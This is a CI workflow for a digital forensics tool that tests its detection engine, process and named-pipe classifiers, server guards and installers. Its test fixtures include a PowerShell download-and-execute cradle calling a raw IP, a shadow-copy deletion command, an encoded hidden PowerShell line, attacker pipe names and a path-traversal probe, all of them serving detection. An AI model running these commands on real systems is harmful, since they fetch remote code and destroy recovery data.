name: CI

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

jobs:
  check:
    name: Syntax + engine smoke test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - name: Syntax check every module
        run: for f in $(git ls-files '*.js' '*.mjs'); do node --check "$f" || exit 1; done
      - name: Engine smoke test
        run: |
          cat > /tmp/smoke.mjs <<'EOF'
          const { analyze } = await import(process.cwd() + '/js/engine.js');
          const enc = (s) => new TextEncoder().encode(s);
          const rep = await analyze([
            { name: 'ConsoleHost_history.txt', data: enc('IEX (New-Object Net.WebClient).DownloadString("http://45.77.12.9/a.ps1")\nvssadmin delete shadows /all /quiet\n') },
            { name: 'empty.bin', data: new Uint8Array() },
          ]);
          console.log(rep.verdict, rep.severity, rep.counts);
          if (!rep.severity.critical) throw new Error('expected a critical finding');
          if (rep.counts.rejected !== 1) throw new Error('expected one rejected file');
          if (!rep.indicators.some((i) => i.value === '45.77.12.9')) throw new Error('expected IP indicator');
          EOF
          node /tmp/smoke.mjs
      - name: Process baseline catches lookalikes without false positives
        run: |
          cat > /tmp/look.mjs <<'EOF'
          const { lookalike } = await import(process.cwd() + '/js/ioc/baseline.js');
          const bad = ['scvhost.exe', 'svch0st.exe', 'lsas.exe', 'expl0rer.exe', 'svchost32.exe', 'svch\u043est.exe', 'dllhot.exe', 'csrsss.exe', 'rundl32.exe', 'winlogin.exe'];
          const good = ['svchost.exe', 'taskhostw.exe', 'lsaiso.exe', 'osppsvc.exe', 'explorer.exe', 'chrome.exe', 'conhost.exe', 'searchhost.exe', 'notepad.exe', 'regedit.exe'];
          const miss = bad.map((n) => JSON.parse(`"${n}"`)).filter((n) => !lookalike(n));
          const fp = good.filter((n) => lookalike(n));
          console.log('missed', miss, 'false positives', fp);
          if (miss.length || fp.length) process.exit(1);
          EOF
          node /tmp/look.mjs
      - name: Disk images (dfvfs test images)
        run: |
          mkdir -p /tmp/dfvfs && cd /tmp/dfvfs
          for f in ext2.raw ext2.E01 ext2.split.E01 ext2.split.E02 ext2.vhd ext2.vhdx ext2.qcow2 ext2.splitraw.000 ext2.splitraw.001 ntfs.raw ntfs-fixed.vhd ntfs-dynamic.vhd ntfs-fixed.vhdx ntfs-dynamic.vhdx ntfs-differential.vhdx gpt.raw mbr.raw bdetogo.raw windows_volume.qcow2; do
            curl -fsSL -o "$f" "https://raw.githubusercontent.com/log2timeline/dfvfs/main/test_data/$f"
          done
          cd "$GITHUB_WORKSPACE" && node test/images.mjs /tmp/dfvfs
      - name: Server image endpoints
        run: |
          (python3 tools/server.py 8793 --no-browser > /tmp/srv2.log 2>&1 &) ; sleep 3
          curl -fsS -H 'X-Sudo-Z: 1' "http://localhost:8793/api/image/stat?path=/tmp/dfvfs/ext2.split.E01" | grep -q 'ext2.split.E02'
          test "$(curl -fsS -H 'X-Sudo-Z: 1' 'http://localhost:8793/api/image/read?path=/tmp/dfvfs/ext2.E01&off=0&len=3')" = "EVF"
          test "$(curl -s -o /dev/null -w '%{http_code}' 'http://localhost:8793/api/image/read?path=/tmp/dfvfs/ext2.E01&off=0&len=3')" = 403
          curl -s -H 'X-Sudo-Z: 1' -X POST -d '{"source":"C:"}' http://localhost:8793/api/kape/run | grep -q 'Windows program'
          curl -fsS -H 'X-Sudo-Z: 1' http://localhost:8793/api/jobs | grep -q '^\['
      - name: Execution evidence (Prefetch, ShimCache, Amcache, UserAssist, SRUM)
        run: node test/execution.mjs
      - name: Suspicious ports (context, sweeps and scans)
        run: node test/ports.mjs
      - name: VirusTotal lookups (click to send, verdicts, no automatic calls)
        run: node test/vt.mjs
      - name: malfind region identification (Meterpreter and friends)
        run: node test/malfind.mjs
      - name: Universal grep across files (premade patterns, output modes)
        run: node test/grep.mjs
      - name: MemProcFS forensic CSVs (FindEvil grading)
        run: node test/memprocfs.mjs
      - name: MACB file times (MFT rules, document / PE / LNK / zip times)
        run: node test/macb.mjs
      - name: bstrings search (chunked scanner, built-in patterns)
        run: node test/bstrings.mjs
      - name: Volatility code injection checks
        run: node test/vol-inject.mjs
      - name: Volatility rootkit checks (SSDT, KTHREAD service tables, DKOM)
        run: node test/vol-rootkit.mjs
      - name: Named pipe checks
        run: |
          cat > /tmp/pipes.mjs <<'EOF'
          const { classifyPipe: c } = await import(process.cwd() + '/js/ioc/pipes.js');
          const bad = [['\\Device\\NamedPipe\\msagent_4f', {}], ['postex_1a2b', {}], ['RemCom_communicaton', {}], ['abc\\pipe\\spoolss', {}], ['PSHost.1.4412.DefaultAppDomain.rundll32', {}], ['k8s2j4h9wq', { name: 'rundll32.exe' }]];
          const good = [['mojo.5100.1.123456', { name: 'chrome.exe' }], ['spoolss', { name: 'spoolsv.exe' }], ['PSHost.1.4412.DefaultAppDomain.powershell', {}], ['x7k2p9qw', { name: 'svchost.exe' }], ['srvsvc', { name: 'rundll32.exe' }]];
          const miss = bad.filter(([p, o]) => !c(p, o)).map((x) => x[0]); const fp = good.filter(([p, o]) => c(p, o)).map((x) => x[0]);
          console.log('missed', miss, 'false positives', fp);
          if (miss.length || fp.length) process.exit(1);
          EOF
          node /tmp/pipes.mjs
      - name: Local server compiles and enforces its guards
        run: |
          python3 -m py_compile tools/server.py
          (python3 tools/server.py 8790 --no-browser > /tmp/srv.log 2>&1 &) ; sleep 3
          test "$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8790/api/caps)" = 403
          test "$(curl -s -o /dev/null -w '%{http_code}' -H 'X-Sudo-Z: 1' -H 'Host: evil.example' http://localhost:8790/api/caps)" = 403
          curl -fsS -H 'X-Sudo-Z: 1' http://localhost:8790/api/caps | grep -q '"local": true'
          curl -fsSI http://localhost:8790/js/engine.js | grep -qi javascript
      - name: CLI runs
        run: |
          printf 'powershell -nop -w hidden -enc SQBFAFgA\n' > ConsoleHost_history.txt
          node cli/sudo-z.mjs ConsoleHost_history.txt -o /tmp/out
          test -s /tmp/out/report.md

  kape-windows:
    name: KAPE job + VHDX mount (Windows)
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: KAPE background job against a read-only mounted VHDX
        shell: pwsh
        run: ./test/kape-job.ps1

  installer-linux:
    name: Installer (Linux)
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-latest
    env:
      GITHUB_TOKEN: ${{ github.token }}
    steps:
      - name: Install from GitHub
        run: curl -fsSL "https://raw.githubusercontent.com/${{ github.repository }}/${{ github.sha }}/install.sh" | SUDOZ_DIR=$RUNNER_TEMP/sz SUDOZ_BIN=$RUNNER_TEMP/bin bash
      - name: Re-run is an update no-op
        run: curl -fsSL "https://raw.githubusercontent.com/${{ github.repository }}/${{ github.sha }}/install.sh" | SUDOZ_DIR=$RUNNER_TEMP/sz SUDOZ_BIN=$RUNNER_TEMP/bin bash | tee /tmp/second.log && grep -q "up to date" /tmp/second.log
      - name: Forced update replaces the code
        run: |
          echo junk > $RUNNER_TEMP/sz/app/STALE
          $RUNNER_TEMP/bin/sudo-z update
          SUDOZ_FORCE=1 SUDOZ_DIR=$RUNNER_TEMP/sz SUDOZ_BIN=$RUNNER_TEMP/bin bash $RUNNER_TEMP/sz/app/install.sh
          test ! -e $RUNNER_TEMP/sz/app/STALE
      - name: Fallback works without the API
        run: |
          GITHUB_TOKEN= SUDOZ_REPO=${{ github.repository }} bash -c 'source <(sed -n "/^sha_of()/,/^}/p" $RUNNER_TEMP/sz/app/install.sh); REPO=$SUDOZ_REPO; curl() { case "$*" in *api.github.com*) return 22;; *) command curl "$@";; esac; }; s=$(sha_of main); echo "fallback sha $s"; [ ${#s} -eq 40 ]'
      - name: Launcher serves the console
        run: |
          $RUNNER_TEMP/bin/sudo-z version
          ($RUNNER_TEMP/bin/sudo-z start 8799 &) ; sleep 3
          curl -fsS http://localhost:8799/ | grep -q "SUDO-Z"
          curl -fsSI http://localhost:8799/js/engine.js | grep -qi "javascript"

  installer-windows:
    name: Installer (Windows)
    if: github.event_name != 'pull_request'
    runs-on: windows-latest
    env:
      GITHUB_TOKEN: ${{ github.token }}
    steps:
      - name: Install from GitHub
        shell: powershell
        run: |
          $s = Invoke-RestMethod "https://raw.githubusercontent.com/${{ github.repository }}/${{ github.sha }}/install.ps1"
          & ([scriptblock]::Create($s)) -Dir "$env:RUNNER_TEMP\sz" -NoShortcut
          if (-not (Test-Path "$env:RUNNER_TEMP\sz\app\index.html")) { throw 'not installed' }
          if (-not (Test-Path "$env:RUNNER_TEMP\sz\sudo-z.cmd")) { throw 'no launcher' }
      - name: Update replaces old code
        shell: powershell
        run: |
          Set-Content "$env:RUNNER_TEMP\sz\app\STALE" 'junk'
          & "$env:RUNNER_TEMP\sz\app\install.ps1" -Dir "$env:RUNNER_TEMP\sz" -NoShortcut -Force
          if (Test-Path "$env:RUNNER_TEMP\sz\app\STALE") { throw 'old code not replaced' }
          & "$env:RUNNER_TEMP\sz\sudo-z.cmd" version
          & "$env:RUNNER_TEMP\sz\sudo-z.cmd" update
      - name: Launcher serves the console
        shell: powershell
        run: |
          Start-Process -FilePath "$env:RUNNER_TEMP\sz\sudo-z.cmd" -ArgumentList 'start','-Port','8799','-NoBrowser'
          Start-Sleep 6
          $r = Invoke-WebRequest http://localhost:8799/ -UseBasicParsing
          if ($r.Content -notmatch 'SUDO-Z') { throw 'index not served' }
          $j = Invoke-WebRequest http://localhost:8799/js/engine.js -UseBasicParsing
          if ($j.Headers['Content-Type'] -notmatch 'javascript') { throw "bad MIME $($j.Headers['Content-Type'])" }
          try { Invoke-WebRequest 'http://localhost:8799/..%2f..%2fversion.txt' -UseBasicParsing; throw 'path traversal not blocked' } catch { if ($_.Exception.Message -eq 'path traversal not blocked') { throw } }
